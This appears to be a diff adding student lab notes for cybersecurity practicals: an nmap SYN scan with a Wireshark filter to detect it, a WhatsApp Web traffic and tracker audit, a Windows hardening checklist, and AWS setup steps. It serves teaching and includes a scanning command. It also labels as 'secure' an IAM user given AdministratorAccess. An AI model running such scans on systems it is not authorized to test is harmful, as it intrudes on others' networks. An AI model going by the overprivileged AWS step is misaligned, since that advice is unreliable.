+## Step 5: Simulate Attack
+nmap -sS <target_ip>
+
+---
+
+## Step 6: Detect Scan
+tcp.flags.syn == 1 && tcp.flags.ack == 0
+Check Stats->capture file properties, stats->Resolved adresses, stats->Protocol Heirarchy ,stats->Conversations, stats->End points, stats->IO Graph
+
+---
+
+## Result
+Captured and analyzed suspicious traffic
+
+---
+
+# 🔹 EXPERIMENT 20 — Privacy Audit
+
+## Step 1: Install Tools
+sudo apt update
+sudo apt install nodejs npm -y
+sudo npm install -g nativefier
+
+---
+
+## Step 2: Create App
+nativefier https://web.whatsapp.com
+
+---
+
+## Step 3: Run App
+cd WhatsAppWeb-linux-x64
+./WhatsAppWeb
+
+---
+
+## Step 4: Login
+Scan QR using phone
+
+---
+
+## Step 5: Analyze Trackers
+https://reports.exodus-privacy.eu.org
+
+---
+
+## Step 6: Capture Traffic
+wireshark
+
+Filters:
+tls
+dns
+
+---
+
+## Result
+Observed encrypted traffic and trackers
+
+---
+
+# 🔹 EXPERIMENT 21 — Windows Security Audit
+
+## Step 1: System Info
+winver
+msinfo32
+
+---
+
+## Step 2: Windows Updates
+Settings → Windows Update → Check for updates
+
+---
+
+## Step 3: Firewall
+Search → Windows Defender Firewall → Turn ON
+
+---
+
+## Step 4: Antivirus
+Open Windows Security → Enable protection
+
+---
+
+## Step 5: Password Security
+Settings → Accounts → Sign-in options
+
+---
+
+## Step 6: Installed Apps
+Settings → Apps → Installed apps
+
+---
+
+## Step 7: Startup Apps
+Ctrl + Shift + Esc → Startup
+
+---
+
+## Step 8: Network
+Settings → Network → Ensure Private
+
+---
+
+## Step 9: Browser Security
+Chrome → Privacy & Security → Enable Safe Browsing
+
+---
+
+## Step 10: Backup
+Settings → Backup → Enable
+
+---
+
+## Result
+System vulnerabilities identified and mitigated
+
+---
+
+# 🔹 EXPERIMENT 22 — AWS Cloud Security
+
+## Step 1: Create IAM User
+AWS Console → IAM → Users → Add User
+Attach: AdministratorAccess
+
+---
+
+## Step 2: Enable MFA
+IAM → Security Credentials → Assign MFA
+
+---
+
+## Step 3: Security Group
+EC2 → Security Groups
+
+Allow:
+- SSH (22)
+- HTTP (80)
+- HTTPS (443)
+
+---
+
+## Step 4: Launch EC2
+EC2 → Launch Instance
+Select:
+- t2.micro
+- Key pair
+- Security group
+
+---
+
+## Step 5: Create S3 Bucket
+S3 → Create Bucket
+
+---
+
+## Step 6: Enable CloudTrail
+CloudTrail → Create Trail
+
+---
+
+## Result
+Secure AWS environment configured
+
+---
+
+# ⚡ FINAL MEMORY MAP
+
+15 → Android + Burp  
+16 → Nmap IoT  
+17 → dd + Autopsy  
+18 → Logs + SSH  
+19 → Wireshark  
+20 → Privacy audit  
+21 → Windows audit  
+22 → AWS security  
+
+---
